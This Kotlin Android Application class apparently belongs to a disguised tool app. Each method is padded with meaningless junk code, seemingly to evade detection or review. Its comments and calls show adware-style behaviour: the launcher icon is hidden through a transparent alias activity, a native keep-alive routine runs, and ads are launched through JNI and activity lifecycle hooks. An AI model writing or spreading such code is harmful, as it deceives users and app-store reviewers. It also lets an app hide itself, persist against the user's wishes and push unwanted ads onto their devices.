package jsom.dcckr.ptij

import android.app.Application
import android.content.Intent
import android.os.Bundle
import jsom.dcckr.ptij.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import jsom.dnbn.zhohu.ad.runtime.AdLifecycleInstaller
import jsom.dnbn.zhohu.base.APPContext
import jsom.dnbn.zhohu.base.OverseaAppHost
import jsom.dnbn.zhohu.base.OverseaAppInitializer


class AFF : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: AFF? = null
    }

    override fun onCreate() {
        val arr_xHwtxOLkpofXqc = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_qMsiYmoTtkMqs  = (arr_xHwtxOLkpofXqc  shl 10) xor (arr_xHwtxOLkpofXqc  shr 87)
         val j_CRxbDYR  = i_qMsiYmoTtkMqs .inv() and 0xFFFF
         if (j_CRxbDYR  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_aKpDL")
         }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val arr_zjnnmx = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_oKtCWVCZpeTOHab  = (arr_zjnnmx  shl 74) xor (arr_zjnnmx  shr 64)
         val j_avDYXB  = i_oKtCWVCZpeTOHab .inv() and 0xFFFF
         if (j_avDYXB  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_lWSztSZSYfUyTjW")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
           val tyCCCEwUvHBXvHFix : Any = if (kotlin.random.Random.nextBoolean()) 96 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val fiYQABTpF  = (tyCCCEwUvHBXvHFix  as? String)?.reversed() ?: "wqnruK_1833378454"

        if (fiYQABTpF  == "AwjDPthudrYXCpP") {
            java.lang.System.out.print(fiYQABTpF )
        }
        NWDX.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_hvGntEIkjtduGXO  = listOf("VPysCXMDROSmfLCqdH", "ccsAqYPYL", "RHbjXl").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_HuHOpazjyvStpWvfi  = arr_hvGntEIkjtduGXO .filter { it.length > 38 }
         if (ad_HuHOpazjyvStpWvfi .isNotEmpty() && java.lang.System.currentTimeMillis() < 96) {
             ad_HuHOpazjyvStpWvfi .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val MYjFhg : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val ctKwbFCoCcbajKQX  = MYjFhg ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_8" 
            }
            if (ctKwbFCoCcbajKQX .startsWith("sVZWuaAHrR ")) {
                android.util.Log.v("TAG", ctKwbFCoCcbajKQX )
            }
        // 启动图标隐藏：禁用 KVTQ 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, NWCE::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }


    override fun initKeepPower(app: Application) {
           val bPdsCkhSNfm : Any = if (kotlin.random.Random.nextBoolean()) 37 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val QKUsnhTMHCvLzlf  = (bPdsCkhSNfm  as? String)?.reversed() ?: "tPROyHYj_-2145726107"

        if (QKUsnhTMHCvLzlf  == "RGUJlTgsPrOPzNZ") {
            java.lang.System.out.print(QKUsnhTMHCvLzlf )
        }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}